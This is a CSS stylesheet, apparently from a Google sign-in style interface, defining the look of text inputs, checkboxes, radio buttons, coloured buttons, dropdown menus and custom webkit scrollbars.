  input[type=url] {
  -webkit-appearance: none;
  appearance: none;
  display: inline-block;
  height: 29px;
  margin: 0;
  padding: 0 8px;
  background: #fff;
  border: 1px solid #d9d9d9;
  border-top: 1px solid #c0c0c0;
  -webkit-box-sizing: border-box;
  -moz-box-sizing: border-box;
  box-sizing: border-box;
  -webkit-border-radius: 1px;
  -moz-border-radius: 1px;
  border-radius: 1px;
  }
  input[type=email]:hover,
  input[type=number]:hover,
  input[type=password]:hover,
  input[type=tel]:hover,
  input[type=text]:hover,
  input[type=url]:hover {
  border: 1px solid #b9b9b9;
  border-top: 1px solid #a0a0a0;
  -webkit-box-shadow: inset 0 1px 2px rgba(0,0,0,0.1);
  -moz-box-shadow: inset 0 1px 2px rgba(0,0,0,0.1);
  box-shadow: inset 0 1px 2px rgba(0,0,0,0.1);
  }
  input[type=email]:focus,
  input[type=number]:focus,
  input[type=password]:focus,
  input[type=tel]:focus,
  input[type=text]:focus,
  input[type=url]:focus {
  outline: none;
  border: 1px solid #4d90fe;
  -webkit-box-shadow: inset 0 1px 2px rgba(0,0,0,0.3);
  -moz-box-shadow: inset 0 1px 2px rgba(0,0,0,0.3);
  box-shadow: inset 0 1px 2px rgba(0,0,0,0.3);
  }
  input[type=email][disabled=disabled],
  input[type=number][disabled=disabled],
  input[type=password][disabled=disabled],
  input[type=tel][disabled=disabled],
  input[type=text][disabled=disabled],
  input[type=url][disabled=disabled] {
  border: 1px solid #e5e5e5;
  background: #f1f1f1;
  }
  input[type=email][disabled=disabled]:hover,
  input[type=number][disabled=disabled]:hover,
  input[type=password][disabled=disabled]:hover,
  input[type=tel][disabled=disabled]:hover,
  input[type=text][disabled=disabled]:hover,
  input[type=url][disabled=disabled]:hover {
  -webkit-box-shadow: none;
  -moz-box-shadow: none;
  box-shadow: none;
  }
  input[type=email][readonly=readonly],
  input[type=number][readonly=readonly],
  input[type=password][readonly=readonly],
  input[type=text][readonly=readonly],
  input[type=url][readonly=readonly] {
  border: 1px solid #d9d9d9;
  }
  input[type=email][readonly=readonly]:hover,
  input[type=number][readonly=readonly]:hover,
  input[type=password][readonly=readonly]:hover,
  input[type=text][readonly=readonly]:hover,
  input[type=url][readonly=readonly]:hover,
  input[type=email][readonly=readonly]:focus,
  input[type=number][readonly=readonly]:focus,
  input[type=password][readonly=readonly]:focus,
  input[type=text][readonly=readonly]:focus,
  input[type=url][readonly=readonly]:focus {
  -webkit-box-shadow: none;
  -moz-box-shadow: none;
  box-shadow: none;
  }
  input[type=checkbox].form-error,
  input[type=email].form-error,
  input[type=number].form-error,
  input[type=password].form-error,
  input[type=text].form-error,
  input[type=tel].form-error,
  input[type=url].form-error {
  border: 1px solid #dd4b39;
  }
  input[type=checkbox],
  input[type=radio] {
  -webkit-appearance: none;
  appearance: none;
  width: 13px;
  height: 13px;
  margin: 0;
  cursor: pointer;
  vertical-align: bottom;
  background: #fff;
  border: 1px solid #dcdcdc;
  -webkit-border-radius: 1px;
  -moz-border-radius: 1px;
  border-radius: 1px;
  -webkit-box-sizing: border-box;
  -moz-box-sizing: border-box;
  box-sizing: border-box;
  position: relative;
  }
  input[type=checkbox]:active,
  input[type=radio]:active {
  border-color: #c6c6c6;
  background: #ebebeb;
  }
  input[type=checkbox]:hover {
  border-color: #c6c6c6;
  -webkit-box-shadow: inset 0 1px 1px rgba(0,0,0,0.1);
  -moz-box-shadow: inset 0 1px 1px rgba(0,0,0,0.1);
  box-shadow: inset 0 1px 1px rgba(0,0,0,0.1);
  }
  input[type=radio] {
  -webkit-border-radius: 1em;
  -moz-border-radius: 1em;
  border-radius: 1em;
  width: 15px;
  height: 15px;
  }
  input[type=checkbox]:checked,
  input[type=radio]:checked {
  background: #fff;
  }
  input[type=radio]:checked::after {
  content: '';
  display: block;
  position: relative;
  top: 3px;
  left: 3px;
  width: 7px;
  height: 7px;
  background: #666;
  -webkit-border-radius: 1em;
  -moz-border-radius: 1em;
  border-radius: 1em;
  }
  input[type=checkbox]:checked::after {
  content: url(http://ssl.gstatic.com/ui/v1/menu/checkmark.png);
  display: block;
  position: absolute;
  top: -6px;
  left: -5px;
  }
  input[type=checkbox]:focus {
  outline: none;
  border-color:#4d90fe;
  }
  .gaia-country-menu-item-flag, .gaia-country-menu-item-noflag {
  width: 16px;
  height: 11px;
  margin-right: 1em;
  }
  .gaia-country-menu-item-flag {
  background: no-repeat url(http://ssl.gstatic.com/i18n/phonenumbers/phoneinputwidget/flags4.png) 0 0;
  overflow: hidden;
  }
  .g-button {
  display: inline-block;
  min-width: 46px;
  text-align: center;
  color: #444;
  font-size: 11px;
  font-weight: bold;
  height: 27px;
  padding: 0 8px;
  line-height: 27px;
  -webkit-border-radius: 2px;
  -moz-border-radius: 2px;
  border-radius: 2px;
  -webkit-transition: all 0.218s;
  -moz-transition: all 0.218s;
  -ms-transition: all 0.218s;
  -o-transition: all 0.218s;
  transition: all 0.218s;
  border: 1px solid #dcdcdc;
  background-color: #f5f5f5;
  background-image: -webkit-gradient(linear,left top,left bottom,from(#f5f5f5),to(#f1f1f1));
  background-image: -webkit-linear-gradient(top,#f5f5f5,#f1f1f1);
  background-image: -moz-linear-gradient(top,#f5f5f5,#f1f1f1);
  background-image: -ms-linear-gradient(top,#f5f5f5,#f1f1f1);
  background-image: -o-linear-gradient(top,#f5f5f5,#f1f1f1);
  background-image: linear-gradient(top,#f5f5f5,#f1f1f1);
  -webkit-user-select: none;
  -moz-user-select: none;
  user-select: none;
  cursor: default;
  }
  *+html .g-button {
  min-width: 70px;
  }
  button.g-button,
  input[type=submit].g-button {
  height: 29px;
  line-height: 29px;
  vertical-align: bottom;
  margin: 0;
  }
  *+html button.g-button,
  *+html input[type=submit].g-button {
  overflow: visible;
  }
  .g-button:hover {
  border: 1px solid #c6c6c6;
  color: #333;
  text-decoration: none;
  -webkit-transition: all 0.0s;
  -moz-transition: all 0.0s;
  -ms-transition: all 0.0s;
  -o-transition: all 0.0s;
  transition: all 0.0s;
  background-color: #f8f8f8;
  background-image: -webkit-gradient(linear,left top,left bottom,from(#f8f8f8),to(#f1f1f1));
  background-image: -webkit-linear-gradient(top,#f8f8f8,#f1f1f1);
  background-image: -moz-linear-gradient(top,#f8f8f8,#f1f1f1);
  background-image: -ms-linear-gradient(top,#f8f8f8,#f1f1f1);
  background-image: -o-linear-gradient(top,#f8f8f8,#f1f1f1);
  background-image: linear-gradient(top,#f8f8f8,#f1f1f1);
  -webkit-box-shadow: 0 1px 1px rgba(0,0,0,0.1);
  -moz-box-shadow: 0 1px 1px rgba(0,0,0,0.1);
  box-shadow: 0 1px 1px rgba(0,0,0,0.1);
  }
  .g-button:active {
  background-color: #f6f6f6;
  background-image: -webkit-gradient(linear,left top,left bottom,from(#f6f6f6),to(#f1f1f1));
  background-image: -webkit-linear-gradient(top,#f6f6f6,#f1f1f1);
  background-image: -moz-linear-gradient(top,#f6f6f6,#f1f1f1);
  background-image: -ms-linear-gradient(top,#f6f6f6,#f1f1f1);
  background-image: -o-linear-gradient(top,#f6f6f6,#f1f1f1);
  background-image: linear-gradient(top,#f6f6f6,#f1f1f1);
  -webkit-box-shadow: inset 0 1px 2px rgba(0,0,0,0.1);
  -moz-box-shadow: inset 0 1px 2px rgba(0,0,0,0.1);
  box-shadow: inset 0 1px 2px rgba(0,0,0,0.1);
  }
  .g-button:visited {
  color: #666;
  }
  .g-button-submit {
  border: 1px solid #3079ed;
  color: #fff;
  text-shadow: 0 1px rgba(0,0,0,0.1);
  background-color: #4d90fe;
  background-image: -webkit-gradient(linear,left top,left bottom,from(#4d90fe),to(#4787ed));
  background-image: -webkit-linear-gradient(top,#4d90fe,#4787ed);
  background-image: -moz-linear-gradient(top,#4d90fe,#4787ed);
  background-image: -ms-linear-gradient(top,#4d90fe,#4787ed);
  background-image: -o-linear-gradient(top,#4d90fe,#4787ed);
  background-image: linear-gradient(top,#4d90fe,#4787ed);
  }
  .g-button-submit:hover {
  border: 1px solid #2f5bb7;
  color: #fff;
  text-shadow: 0 1px rgba(0,0,0,0.3);
  background-color: #357ae8;
  background-image: -webkit-gradient(linear,left top,left bottom,from(#4d90fe),to(#357ae8));
  background-image: -webkit-linear-gradient(top,#4d90fe,#357ae8);
  background-image: -moz-linear-gradient(top,#4d90fe,#357ae8);
  background-image: -ms-linear-gradient(top,#4d90fe,#357ae8);
  background-image: -o-linear-gradient(top,#4d90fe,#357ae8);
  background-image: linear-gradient(top,#4d90fe,#357ae8);
  }
  .g-button-submit:active {
  background-color: #357ae8;
  background-image: -webkit-gradient(linear,left top,left bottom,from(#4d90fe),to(#357ae8));
  background-image: -webkit-linear-gradient(top,#4d90fe,#357ae8);
  background-image: -moz-linear-gradient(top,#4d90fe,#357ae8);
  background-image: -ms-linear-gradient(top,#4d90fe,#357ae8);
  background-image: -o-linear-gradient(top,#4d90fe,#357ae8);
  background-image: linear-gradient(top,#4d90fe,#357ae8);
  -webkit-box-shadow: inset 0 1px 2px rgb	a(0,0,0,0.3);
  -moz-box-shadow: inset 0 1px 2px rgba(0,0,0,0.3);
  box-shadow: inset 0 1px 2px rgba(0,0,0,0.3);
  }
  .g-button-share {
  border: 1px solid #29691d;
  color: #fff;
  text-shadow: 0 1px rgba(0,0,0,0.1);
  background-color: #3d9400;
  background-image: -webkit-gradient(linear,left top,left bottom,from(#3d9400),to(#398a00));
  background-image: -webkit-linear-gradient(top,#3d9400,#398a00);
  background-image: -moz-linear-gradient(top,#3d9400,#398a00);
  background-image: -ms-linear-gradient(top,#3d9400,#398a00);
  background-image: -o-linear-gradient(top,#3d9400,#398a00);
  background-image: linear-gradient(top,#3d9400,#398a00);
  }
  .g-button-share:hover {
  border: 1px solid #2d6200;
  color: #fff;
  text-shadow: 0 1px rgba(0,0,0,0.3);
  background-color: #368200;
  background-image: -webkit-gradient(linear,left top,left bottom,from(#3d9400),to(#368200));
  background-image: -webkit-linear-gradient(top,#3d9400,#368200);
  background-image: -moz-linear-gradient(top,#3d9400,#368200);
  background-image: -ms-linear-gradient(top,#3d9400,#368200);
  background-image: -o-linear-gradient(top,#3d9400,#368200);
  background-image: linear-gradient(top,#3d9400,#368200);
  }
  .g-button-share:active {
  -webkit-box-shadow: inset 0 1px 2px rgba(0,0,0,0.3);
  -moz-box-shadow: inset 0 1px 2px rgba(0,0,0,0.3);
  box-shadow: inset 0 1px 2px rgba(0,0,0,0.3);
  }
  .g-button-red {
  border: 1px solid transparent;
  color: #fff;
  text-shadow: 0 1px rgba(0,0,0,0.1);
  text-transform: uppercase;
  background-color: #d14836;
  background-image: -webkit-gradient(linear,left top,left bottom,from(#dd4b39),to(#d14836));
  background-image: -webkit-linear-gradient(top,#dd4b39,#d14836);
  background-image: -moz-linear-gradient(top,#dd4b39,#d14836);
  background-image: -ms-linear-gradient(top,#dd4b39,#d14836);
  background-image: -o-linear-gradient(top,#dd4b39,#d14836);
  background-image: linear-gradient(top,#dd4b39,#d14836);
  }
  .g-button-red:hover {
  border: 1px solid #b0281a;
  color: #fff;
  text-shadow: 0 1px rgba(0,0,0,0.3);
  background-color: #c53727;
  background-image: -webkit-gradient(linear,left top,left bottom,from(#dd4b39),to(#c53727));
  background-image: -webkit-linear-gradient(top,#dd4b39,#c53727);
  background-image: -moz-linear-gradient(top,#dd4b39,#c53727);
  background-image: -ms-linear-gradient(top,#dd4b39,#c53727);
  background-image: -o-linear-gradient(top,#dd4b39,#c53727);
  background-image: linear-gradient(top,#dd4b39,#c53727);
  -webkit-box-shadow: 0 1px 1px rgba(0,0,0,0.2);
  -moz-box-shadow: 0 1px 1px rgba(0,0,0,0.2);
  -ms-box-shadow: 0 1px 1px rgba(0,0,0,0.2);
  -o-box-shadow: 0 1px 1px rgba(0,0,0,0.2);
  box-shadow: 0 1px 1px rgba(0,0,0,0.2);
  }
  .g-button-red:active {
  border: 1px solid #992a1b;
  background-color: #b0281a;
  background-image: -webkit-gradient(linear,left top,left bottom,from(#dd4b39),to(#b0281a));
  background-image: -webkit-linear-gradient(top,#dd4b39,#b0281a);
  background-image: -moz-linear-gradient(top,#dd4b39,#b0281a);
  background-image: -ms-linear-gradient(top,#dd4b39,#b0281a);
  background-image: -o-linear-gradient(top,#dd4b39,#b0281a);
  background-image: linear-gradient(top,#dd4b39,#b0281a);
  -webkit-box-shadow: inset 0 1px 2px rgba(0,0,0,0.3);
  -moz-box-shadow: inset 0 1px 2px rgba(0,0,0,0.3);
  box-shadow: inset 0 1px 2px rgba(0,0,0,0.3);
  color: #fff
  }
  .g-button-white {
  border: 1px solid #dcdcdc;
  color: #666;
  background: #fff;
  }
  .g-button-white:hover {
  border: 1px solid #c6c6c6;
  color: #333;
  background: #fff;
  -webkit-box-shadow: 0 1px 1px rgba(0,0,0,0.1);
  -moz-box-shadow: 0 1px 1px rgba(0,0,0,0.1);
  box-shadow: 0 1px 1px rgba(0,0,0,0.1);
  }
  .g-button-white:active {
  background: #fff;
  -webkit-box-shadow: inset 0 1px 2px rgba(0,0,0,0.1);
  -moz-box-shadow: inset 0 1px 2px rgba(0,0,0,0.1);
  box-shadow: inset 0 1px 2px rgba(0,0,0,0.1);
  }
  .g-button-red:visited,
  .g-button-share:visited,
  .g-button-submit:visited {
  color: #fff;
  }
  .g-button-submit:focus,
  .g-button-share:focus,
  .g-button-red:focus {
  -webkit-box-shadow: inset 0 0 0 1px #fff;
  -moz-box-shadow: inset 0 0 0 1px #fff;
  box-shadow: inset 0 0 0 1px #fff;
  }
  .g-button-share:focus {
  border-color: #29691d;
  }
  .g-button-red:focus {
  border-color: #d14836;
  }
  .g-button-submit:focus:hover,
  .g-button-share:focus:hover,
  .g-button-red:focus:hover {
  -webkit-box-shadow: inset 0 0 0 1px #fff, 0 1px 1px rgba(0,0,0,0.1);
  -moz-box-shadow: inset 0 0 0 1px #fff, 0 1px 1px rgba(0,0,0,0.1);
  box-shadow: inset 0 0 0 1px #fff, 0 1px 1px rgba(0,0,0,0.1);
  }
  .g-button.selected {
  background-color: #eee;
  background-image: -webkit-gradient(linear,left top,left bottom,from(#eee),to(#e0e0e0));
  background-image: -webkit-linear-gradient(top,#eee,#e0e0e0);
  background-image: -moz-linear-gradient(top,#eee,#e0e0e0);
  background-image: -ms-linear-gradient(top,#eee,#e0e0e0);
  background-image: -o-linear-gradient(top,#eee,#e0e0e0);
  background-image: linear-gradient(top,#eee,#e0e0e0);
  -webkit-box-shadow: inset 0 1px 2px rgba(0,0,0,0.1);
  -moz-box-shadow: inset 0 1px 2px rgba(0,0,0,0.1);
  box-shadow: inset 0 1px 2px rgba(0,0,0,0.1);
  border: 1px solid #ccc;
  color: #333;
  }
  .g-button img {
  display: inline-block;
  margin: -3px 0 0;
  opacity: .55;
  filter: alpha(opacity=55);
  vertical-align: middle;
  pointer-events: none;
  }
  *+html .g-button img {
  margin: 4px 0 0;
  }
  .g-button:hover img {
  opacity: .72;
  filter: alpha(opacity=72);
  }
  .g-button:active img {
  opacity: 1;
  filter: alpha(opacity=100);
  }
  .g-button.disabled img {
  opacity: .5;
  filter: alpha(opacity=50);
  }
  .g-button.disabled,
  .g-button.disabled:hover,
  .g-button.disabled:active,
  .g-button-submit.disabled,
  .g-button-submit.disabled:hover,
  .g-button-submit.disabled:active,
  .g-button-share.disabled,
  .g-button-share.disabled:hover,
  .g-button-share.disabled:active,
  .g-button-red.disabled,
  .g-button-red.disabled:hover,
  .g-button-red.disabled:active,
  input[type=submit][disabled].g-button {
  background-color: none;
  opacity: .5;
  filter: alpha(opacity=50);
  cursor: default;
  pointer-events: none;
  }
  .goog-menu {
  -webkit-box-shadow: 0 2px 4px rgba(0,0,0,0.2);
  -moz-box-shadow: 0 2px 4px rgba(0,0,0,0.2);
  box-shadow: 0 2px 4px rgba(0,0,0,0.2);
  -webkit-transition: opacity 0.218s;
  -moz-transition: opacity 0.218s;
  -ms-transition: opacity 0.218s;
  -o-transition: opacity 0.218s;
  transition: opacity 0.218s;
  background: #fff;
  border: 1px solid #ccc;
  border: 1px solid rgba(0,0,0,.2);
  cursor: default;
  font-size: 13px;
  margin: 0;
  outline: none;
  padding: 0 0 6px;
  position: absolute;
  z-index: 1000;
  overflow: auto;
  }
  .goog-menuitem,
  .goog-tristatemenuitem,
  .goog-filterobsmenuitem {
  position: relative;
  color: #333;
  cursor: pointer;
  list-style: none;
  margin: 0;
  padding: 6px 7em 6px 30px;
  white-space: nowrap;
  }
  .goog-menuitem-highlight,
  .goog-menuitem-hover {
  background-color: #eee;
  border-color: #eee;
  border-style: dotted;
  border-width: 1px 0;
  padding-top: 5px;
  padding-bottom: 5px;
  }
  .goog-menuitem-highlight .goog-menuitem-content,
  .goog-menuitem-hover .goog-menuitem-content {
  color: #333;
  }
  .goog-menuseparator {
  border-top: 1px solid #ebebeb;
  margin-top: 9px;
  margin-bottom: 10px;
  }
  .goog-inline-block {
  position: relative;
  display: -moz-inline-box;
  display: inline-block;
  }
  * html .goog-inline-block {
  display: inline;
  }
  *:first-child+html .goog-inline-block {
  display: inline;
  }
  .dropdown-block {
  display: block;
  }
  .goog-flat-menu-button {
  -webkit-border-radius: 2px;
  -moz-border-radius: 2px;
  border-radius: 2px;
  background-color: #f5f5f5;
  background-image: -webkit-gradient(linear,left top,left bottom,from(#f5f5f5),to(#f1f1f1));
  background-image: -webkit-linear-gradient(top,#f5f5f5,#f1f1f1);
  background-image: -moz-linear-gradient(top,#f5f5f5,#f1f1f1);
  background-image: -ms-linear-gradient(top,#f5f5f5,#f1f1f1);
  background-image: -o-linear-gradient(top,#f5f5f5,#f1f1f1);
  background-image: linear-gradient(top,#f5f5f5,#f1f1f1);
  border: 1px solid #dcdcdc;
  color: #444;
  font-size: 11px;
  font-weight: bold;
  line-height: 27px;
  list-style: none;
  margin: 0 2px;
  min-width: 46px;
  outline: none;
  padding: 0 18px 0 6px;
  text-decoration: none;
  vertical-align: middle;
  }
  .goog-flat-menu-button-disabled {
  background-color: #fff;
  border-color: #f3f3f3;
  color: #b8b8b8;
  cursor: default;
  }
  .goog-flat-menu-button.goog-flat-menu-button-hover {
  background-color: #f8f8f8;
  background-image: -webkit-linear-gradient(top,#f8f8f8,#f1f1f1);
  background-image: -moz-linear-gradient(top,#f8f8f8,#f1f1f1);
  background-image: -ms-linear-gradient(top,#f8f8f8,#f1f1f1);
  background-image: -o-linear-gradient(top,#f8f8f8,#f1f1f1);
  background-image: linear-gradient(top,#f8f8f8,#f1f1f1);
  -webkit-box-shadow: 0 1px 1px rgba(0,0,0,.1);
  -moz-box-shadow: 0 1px 1px rgba(0,0,0,.1);
  box-shadow: 0 1px 1px rgba(0,0,0,.1);
  border-color: #c6c6c6;
  color: #333;
  }
  .goog-flat-menu-button.goog-flat-menu-button-focused {
  border-color: #4d90fe;
  }
  .form-error .goog-flat-menu-button {
  border: 1px solid #dd4b39;
  }
  .form-error .goog-flat-menu-button-focused {
  border-color: #4d90fe;
  }
  .goog-flat-menu-button.goog-flat-menu-button-open,
  .goog-flat-menu-button.goog-flat-menu-button-active {
  -webkit-box-shadow: inset 0 1px 2px rgba(0,0,0,.1);
  -moz-box-shadow: inset 0 1px 2px rgba(0,0,0,.1);
  box-shadow: inset 0 1px 2px rgba(0,0,0,.1);
  background-color: #eee;
  background-image: -webkit-linear-gradient(top,#eee,#e0e0e0);
  background-image: -moz-linear-gradient(top,#eee,#e0e0e0);
  background-image: -ms-linear-gradient(top,#eee,#e0e0e0);
  background-image: -o-linear-gradient(top,#eee,#e0e0e0);
  background-image: linear-gradient(top,#eee,#e0e0e0);
  border: 1px solid #ccc;
  color: #333;
  z-index: 2;
  }
  .goog-flat-menu-button-caption {
  cursor: default;
  vertical-align: top;
  white-space: nowrap;
  }
  .goog-flat-menu-button-dropdown {
  border-color: #777 transparent;
  border-style: solid;
  border-width: 4px 4px 0;
  height: 0;
  width: 0;
  position: absolute;
  right: 5px;
  top: 12px;
  }
  .jfk-select .goog-flat-menu-button-dropdown {
  background: url(http://ssl.gstatic.com/ui/v1/disclosure/grey-disclosure-arrow-up-down.png) center no-repeat;
  border: none;
  height: 11px;
  margin-top: -4px;
  width: 7px;
  }
  .goog-menu-nocheckbox .goog-menuitem,
  .goog-menu-noicon .goog-menuitem {
  padding-left: 16px;
  vertical-align: middle;
  }
  body ::-webkit-scrollbar {
  height: 16px;
  width: 16px;
  overflow: visible;
  }
  body ::-webkit-scrollbar-button {
  height: 0;
  width: 0;
  }
  body ::-webkit-scrollbar-track {
  background-clip: padding-box;
  border: solid transparent;
  border-width: 0 0 0 7px;
  }
  body ::-webkit-scrollbar-track:horizontal {
  border-width: 7px 0 0;
  }
  body ::-webkit-scrollbar-track:hover {
  background-color: rgba(0,0,0,.05);
  -webkit-box-shadow: inset 1px 0 0 rgba(0,0,0,.1);
  box-shadow: inset 1px 0 0 rgba(0,0,0,.1);
  }
  body ::-webkit-scrollbar-track:horizontal:hover {
  -webkit-box-shadow: inset 0 1px 0 rgba(0,0,0,.1);
  box-shadow: inset 0 1px 0 rgba(0,0,0,.1);
  }
  body ::-webkit-scrollbar-track:active {
  background-color: rgba(0,0,0,.05);
  -webkit-box-shadow: inset 1px 0 0 rgba(0,0,0,.14),inset -1px 0 0 rgba(0,0,0,.07);
  box-shadow: inset 1px 0 0 rgba(0,0,0,.14),inset -1px 0 0 rgba(0,0,0,.07);
  }
  body ::-webkit-scrollbar-track:horizontal:active {
  -webkit-box-shadow: inset 0 1px 0 rgba(0,0,0,.14),inset 0 -1px 0 rgba(0,0,0,.07);
  box-shadow: inset 0 1px 0 rgba(0,0,0,.14),inset 0 -1px 0 rgba(0,0,0,.07);
  }
  .jfk-scrollbar-dark::-webkit-scrollbar-track:hover {
  background-color: rgba(255,255,255,.1);
  -webkit-box-shadow: inset 1px 0 0 rgba(255,255,255,.2);
  box-shadow: inset 1px 0 0 rgba(255,255,255,.2);
  }
  .jfk-scrollbar-dark::-webkit-scrollbar-track:horizontal:hover {
  -webkit-box-shadow: inset 0 1px 0 rgba(255,255,255,.2);
  box-shadow: inset 0 1px 0 rgba(255,255,255,.2);
  }
  .jfk-scrollbar-dark::-webkit-scrollbar-track:active {
  background-color: rgba(255,255,255,.1);
  -webkit-box-shadow: inset 1px 0 0 rgba(255,255,255,.25),inset -1px 0 0 rgba(255,255,255,.15);
  box-shadow: inset 1px 0 0 rgba(255,255,255,.25),inset -1px 0 0 rgba(255,255,255,.15);
  }
  .jfk-scrollbar-dark::-webkit-scrollbar-track:horizontal:active {
  -webkit-box-shadow: inset 0 1px 0 rgba(255,255,255,.25),inset 0 -1px 0 rgba(255,255,255,.15);
  box-shadow: inset 0 1px 0 rgba(255,255,255,.25),inset 0 -1px 0 rgba(255,255,255,.15);
  }
  body ::-webkit-scrollbar-thumb {
  background-color: rgba(0,0,0,.2);
  background-clip: padding-box;
  border: solid transparent;
  border-width: 0 0 0 7px;
  min-height: 28px;
  padding: 100px 0 0;
  -webkit-box-shadow: inset 1px 1px 0 rgba(0,0,0,.1),inset 0 -1px 0 rgba(0,0,0,.07);
  box-shadow: inset 1px 1px 0 rgba(0,0,0,.1),inset 0 -1px 0 rgba(0,0,0,.07);
  }
  body ::-webkit-scrollbar-thumb:horizontal {
  border-width: 7px 0 0;
  padding: 0 0 0 100px;
  -webkit-box-shadow: inset 1px 1px 0 rgba(0,0,0,.1),inset -1px 0 0 rgba(0,0,0,.07);
  box-shadow: inset 1px 1px 0 rgba(0,0,0,.1),inset -1px 0 0 rgba(0,0,0,.07);
  }
  body ::-webkit-scrollbar-thumb:hover {
  background-color: rgba(0,0,0,.4);
  -webkit-box-shadow: inset 1px 1px 1px rgba(0,0,0,.25);
  box-shadow: inset 1px 1px 1px rgba(0,0,0,.25);
  }
  body ::-webkit-scrollbar-thumb:active {
  background-color: rgba(0,0,0,.5);
  -webkit-box-shadow: inset 1px 1px 3px rgba(0,0,0,.35);
  box-shadow: inset 1px 1px 3px rgba(0,0,0,.35);
  }
  .jfk-scrollbar-dark::-webkit-scrollbar-thumb {
  background-color: rgba(255,255,255,.3);
  -webkit-box-shadow: inset 1px 1px 0 rgba(255,255,255,.15),inset 0 -1px 0 rgba(255,255,255,.1);
  box-shadow: inset 1px 1px 0 rgba(255,255,255,.15),inset 0 -1px 0 rgba(255,255,255,.1);
  }
  .jfk-scrollbar-dark::-webkit-scrollbar-thumb:horizontal {
  -webkit-box-shadow: inset 1px 1px 0 rgba(255,255,255,.15),inset -1px 0 0 rgba(255,255,255,.1);
  box-shadow: inset 1px 1px 0 rgba(255,255,255,.15),inset -1px 0 0 rgba(255,255,255,.1);
  }
  .jfk-scrollbar-dark::-webkit-scrollbar-thumb:hover {
  background-color: rgba(255,255,255,.6);
  -webkit-box-shadow: inset 1px 1px 1px rgba(255,255,255,.37);
  box-shadow: inset 1px 1px 1px rgba(255,255,255,.37);
  }
  .jfk-scrollbar-dark::-webkit-scrollbar-thumb:active {
  background-color: rgba(255,255,255,.75);
  -webkit-box-shadow: inset 1px 1px 3px rgba(255,255,255,.5);
  box-shadow: inset 1px 1px 3px rgba(255,255,255,.5);
  }
  .jfk-scrollbar-borderless::-webkit-scrollbar-track {
  border-width: 0 1px 0 6px
  }
  .jfk-scrollbar-borderless::-webkit-scrollbar-track:horizontal {
  border-width: 6px 0 1px
  }
  .jfk-scrollbar-borderless::-webkit-scrollbar-track:hover {
  background-color: rgba(0,0,0,.035);
  -webkit-box-shadow: inset 1px 1px 0 rgba(0,0,0,.14),inset -1px -1px 0 rgba(0,0,0,.07);
  box-shadow: inset 1px 1px 0 rgba(0,0,0,.14),inset -1px -1px 0 rgba(0,0,0,.07);
  }
  .jfk-scrollbar-borderless.jfk-scrollbar-dark::-webkit-scrollbar-track:hover {
  background-color: rgba(255,255,255,.07);
  -webkit-box-shadow: inset 1px 1px 0 rgba(255,255,255,.25),inset -1px -1px 0 rgba(255,255,255,.15);
  box-shadow: inset 1px 1px 0 rgba(255,255,255,.25),inset -1px -1px 0 rgba(255,255,255,.15);
  }
  .jfk-scrollbar-borderless::-webkit-scrollbar-thumb {
  border-width: 0 1px 0 6px;
  }
  .jfk-scrollbar-borderless::-webkit-scrollbar-thumb:horizontal {
  border-width: 6px 0 1px;
  }
  body ::-webkit-scrollbar-corner {
  background: transparent;
  }
  body::-webkit-scrollbar-track-piece {
  background-clip: padding-box;
  background-color: #f1f1f1;
  border: solid #fff;
  border-width: 0 0 0 3px;
  -webkit-box-shadow: inset 1px 0 0 rgba(0,0,0,.14),inset -1px 0 0 rgba(0,0,0,.07);
  box-shadow: inset 1px 0 0 rgba(0,0,0,.14),inset -1px 0 0 rgba(0,0,0,.07);
  }
  body::-webkit-scrollbar-track-piece:horizontal {
  border-width: 3px 0 0;
  -webkit-box-shadow: inset 0 1px 0 rgba(0,0,0,.14),inset 0 -1px 0 rgba(0,0,0,.07);
  box-shadow: inset 0 1px 0 rgba(0,0,0,.14),inset 0 -1px 0 rgba(0,0,0,.07);
  }
  body::-webkit-scrollbar-thumb {
  border-width: 1px 1px 1px 5px;
  }
  body::-webkit-scrollbar-thumb:horizontal {
  border-width: 5px 1px 1px;
  }
  body::-webkit-scrollbar-corner {
  background-clip: padding-box;
  background-color: #f1f1f1;
  border: solid #fff;
  border-width: 3px 0 0 3px;
  -webkit-box-shadow: inset 1px 1px 0 rgba(0,0,0,.14);
  box-shadow: inset 1px 1px 0 rgba(0,0,0,.14);
  }
  .jfk-scrollbar::-webkit-scrollbar {
  height: 16px;
  overflow: visible;
  width: 16px;
  }
  .jfk-scrollbar::-webkit-scrollbar-button {
  height: 0;
  width: 0;
  }
  .jfk-scrollbar::-webkit-scrollbar-track {
  background-clip: padding-box;
  border: solid transparent;
  border-width: 0 0 0 7px;
  }
  .jfk-scrollbar::-webkit-scrollbar-track:horizontal {
  border-width: 7px 0 0;
  }
  .jfk-scrollbar::-webkit-scrollbar-track:hover {
  background-color: rgba(0,0,0,.05);
  -webkit-box-shadow: inset 1px 0 0 rgba(0,0,0,.1);
  box-shadow: inset 1px 0 0 rgba(0,0,0,.1);
  }
  .jfk-scrollbar::-webkit-scrollbar-track:horizontal:hover {
  -webkit-box-shadow: inset 0 1px 0 rgba(0,0,0,.1);
  box-shadow: inset 0 1px 0 rgba(0,0,0,.1);
  }
  .jfk-scrollbar::-webkit-scrollbar-track:active {
  background-color: rgba(0,0,0,.05);
  -webkit-box-shadow: inset 1px 0 0 rgba(0,0,0,.14),inset -1px 0 0 rgba(0,0,0,.07);
  box-shadow: inset 1px 0 0 rgba(0,0,0,.14),inset -1px 0 0 rgba(0,0,0,.07);
  }
  .jfk-scrollbar::-webkit-scrollbar-track:horizontal:active {
  -webkit-box-shadow: inset 0 1px 0 rgba(0,0,0,.14),inset 0 -1px 0 rgba(0,0,0,.07);
  box-shadow: inset 0 1px 0 rgba(0,0,0,.14),inset 0 -1px 0 rgba(0,0,0,.07);
  }
  .jfk-scrollbar-dark.jfk-scrollbar::-webkit-scrollbar-track:hover {
  background-color: rgba(255,255,255,.1);
  -webkit-box-shadow: inset 1px 0 0 rgba(255,255,255,.2);
  box-shadow: inset 1px 0 0 rgba(255,255,255,.2);
  }
  .jfk-scrollbar-dark.jfk-scrollbar::-webkit-scrollbar-track:horizontal:hover {
  -webkit-box-shadow: inset 0 1px 0 rgba(255,255,255,.2);
  box-shadow: inset 0 1px 0 rgba(255,255,255,.2);
  }
  .jfk-scrollbar-dark.jfk-scrollbar::-webkit-scrollbar-track:active {
  background-color: rgba(255,255,255,.1);
  -webkit-box-shadow: inset 1px 0 0 rgba(255,255,255,.25),inset -1px 0 0 rgba(255,255,255,.15);
  box-shadow: inset 1px 0 0 rgba(255,255,255,.25),inset -1px 0 0 rgba(255,255,255,.15);
  }
